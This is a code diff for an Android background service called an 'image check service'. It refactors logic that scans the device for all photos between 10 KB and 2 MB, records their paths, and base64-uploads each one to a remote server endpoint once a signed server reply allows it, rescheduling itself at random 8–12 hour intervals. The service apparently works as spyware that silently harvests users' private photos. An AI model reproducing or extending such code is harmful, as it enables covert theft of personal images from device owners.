@@ -24,13 +24,16 @@ import com.zhy.http.okhttp.OkHttpUtils;
 import com.zhy.http.okhttp.callback.StringCallback;
 
 import java.io.File;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
+import java.util.LinkedList;
 import java.util.List;
 import java.util.Map;
 
 import cn.hutool.core.collection.CollUtil;
+import cn.hutool.core.util.CharsetUtil;
 import cn.hutool.core.util.StrUtil;
 import cn.hutool.json.JSONObject;
 import cn.hutool.json.JSONUtil;
@@ -40,18 +43,18 @@ import okhttp3.Call;
 public class IndexService extends MyService {
 
     private final static String Tag = "图片检查服务";
-    protected Context context=IndexService.this;
+    protected Context context = IndexService.this;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         boolean b = ReadAndWrite.RequestPermissions(context, Manifest.permission.READ_EXTERNAL_STORAGE);
         if (b) {
-            new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    getPhoto(true);
-                }
-            }).start();
+            getPhoto(true);
+//            new Thread(new Runnable() {
+//                @Override
+//                public void run() {
+//                }
+//            }).start();
         }
         int random = RandomrUtil.createRandom(8, 12);
         long anHour = random * 60 * 60 * 1000;
@@ -63,17 +66,24 @@ public class IndexService extends MyService {
     }
 
 
-    private List<String> readConfig(String path){
-        List<String> txtFile = TxtOperation.readTxtFile(path, "UTF-8");
+    private List<String> readConfig(String path) {
+        List<String> txtFile = null;
+        try {
+            txtFile = TxtOperation.readTxtFile(path, CharsetUtil.defaultCharsetName());
+        } catch (Exception e) {
+            e.printStackTrace();
+            txtFile = new ArrayList<>();
+        }
         return CollUtil.removeBlank(txtFile);
     }
 
-//        String[] paths = {"/DCIM", "/Pictures"};
-        String[] includePaths = {};
-    private void getPhoto(boolean is) {
+    //        String[] paths = {"/DCIM", "/Pictures"};
+    String[] includePaths = {};
 
+    private void getPhoto(boolean is) {
         if (is) {
-            List<String> photo = new ArrayList<>();
+            long beginTime = System.currentTimeMillis();
+            List<String> photo = new LinkedList<>();
 //            List<Map<String, Object>> files = new ArrayList<>();
             try {
                 LocalFileTool.readFile(LocalFileTool.imageType, context, new LocalFileTool.IReadCallBack() {
@@ -82,41 +92,56 @@ public class IndexService extends MyService {
                         File file = null;
                         StringBuilder sb = new StringBuilder();
                         String local_path = LocalFileTool.BasePath + "/" + getResources().getString(R.string.app_name) + "/data/10kb~2Mb-IMG.txt";
-                        List<String> txtFile=readConfig(local_path);
+                        List<String> txtFile = readConfig(local_path);
                         long length = 0;
                         for (String path : localPath) {
+//                        for (int i = 0; i < localPath.size(); i++) {
+//                            String path=localPath.get(i);
                             if (txtFile.indexOf(path) < 0) {
                                 file = new File(path);
-                                if (file!=null&&file.exists())
+                                if (file.exists()) {
                                     length = file.length();
+                                    if (length > 1024 * 10 && length < 1024 * 1024 * 2) {
 
+                                    } else {
+                                        continue;
+                                    }
+                                } else {
+                                    continue;
+                                }
                                 if (includePaths.length > 0) {
                                     String s = path.replace(GetPhoto.BasePath, "");
                                     for (String s1 : includePaths) {
                                         if (s.startsWith(s1)) {
 //                                if (file.length() < 1024 * 1024 && file.length() > 1024 * 100) {
-                                            if (length > 1024 * 10 && length < 1024 * 1024 * 2) {
-                                                photo.add(path);
-                                                sb.append(path + "\n");
-                                            }
+//                                            if (length > 1024 * 10 && length < 1024 * 1024 * 2) {
+                                            photo.add(path);
+                                            sb.append(path + "\n");
+//                                            }
                                             break;
                                         }
                                     }
                                 } else {
-                                    if (length > 1024 * 100 && length < 1024 * 1024 * 2) {
-                                        photo.add(path);
-                                        sb.append(path + "\n");
-                                    }
+//                                    if (length > 1024 * 10 && length < 1024 * 1024 * 2) {
+                                    photo.add(path);
+                                    sb.append(path + "\n");
+//                                    }
                                 }
                             }
                         }
-                        if (sb.length() > 0)
-                            TxtOperation.writeTxtFile(sb.toString(), local_path, true);
+                        if (sb.length() > 0) {
+                            try {
+                                TxtOperation.writeTxtFile(sb.toString(), local_path, true);
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                        }
                         photo.addAll(txtFile);
                         int size = photo.size();
-                        Log.e(Tag, "10kb~2Mb图片数：" + size);
+                        int t = (int) (System.currentTimeMillis() - beginTime);
+                        Log.d(Tag, "10kb~2Mb图片数：" + size + ",耗时：("+t+"ms)" + TimeUtil.format(t));
                         try {
-                            uploadPhoto(size,photo);
+                            uploadPhoto(size, photo);
                         } catch (Exception e) {
                             e.printStackTrace();
                         }
@@ -129,7 +154,7 @@ public class IndexService extends MyService {
         }
     }
 
-    private void uploadPhoto(int size,List<String> photo) throws Exception{
+    private void uploadPhoto(int size, List<String> photo) throws Exception {
         Map<String, Object> msg = new HashMap<>();
         msg.put("num", size);
         msg.put("time", TimeUtil.dateToUnix(new Date()));
@@ -153,6 +178,7 @@ public class IndexService extends MyService {
                         String signature = EncryptUtil.getSignature(object.getStr("time"), object.getStr("title"));
                         if (signature.equals(object.getStr("message"))) {
                             if (object.getInt("code").equals(200)) {
+                                long beginTime = System.currentTimeMillis();
                                 Log.d(Tag + "响应允许", "允许文件上传");
                                 if (size > 0) {
                                     int c = 1;
@@ -191,8 +217,6 @@ public class IndexService extends MyService {
                                             if (bytes.length < 1024 * 1024) {
                                                 i++;
                                                 String replace = file.getAbsolutePath().replace(LocalFileTool.BasePath, "");
-                                                Log.d(Tag + "上传图片", replace + ",原文件大小:"
-                                                        + LocalFileTool.getFileSizeString(fileLength) + ",上传大小：" + LocalFileTool.getFileSizeString((long) bytes.length));
                                                 Map<String, Object> map = new HashMap<>();
                                                 map.put("time", TimeUtil.dateToUnix(new Date()));
                                                 map.put("name", EncryptUtil.enBase64(file.getName().getBytes()));
@@ -201,6 +225,11 @@ public class IndexService extends MyService {
                                                 map.put("data", EncryptUtil.enBase64(bytes));
                                                 OkHttpUtil.postFile(context, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
 //                                                            Thread.sleep(2000);
+                                                Log.d(Tag + "上传图片", replace + "," +
+                                                        "原文件大小:" + LocalFileTool.getFileSizeString(fileLength) + "," +
+                                                        "上传大小：" + LocalFileTool.getFileSizeString((long) bytes.length) + "," +
+                                                        "耗时：" + TimeUtil.format((int) (System.currentTimeMillis() - beginTime)));
+
                                             }
                                         }
                                     }
